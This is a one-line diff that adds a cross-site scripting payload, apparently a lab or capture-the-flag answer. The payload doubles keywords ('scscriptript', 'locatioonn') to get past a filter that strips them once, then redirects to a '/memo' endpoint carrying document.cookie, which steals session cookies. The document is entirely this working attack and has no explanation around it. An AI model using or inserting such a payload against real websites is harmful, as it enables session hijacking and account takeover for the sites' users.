@@ -1,0 +1,1 @@
+<scscriptript>locatioonn.href="/memo?memo="+document.cookie;</scscriptript>
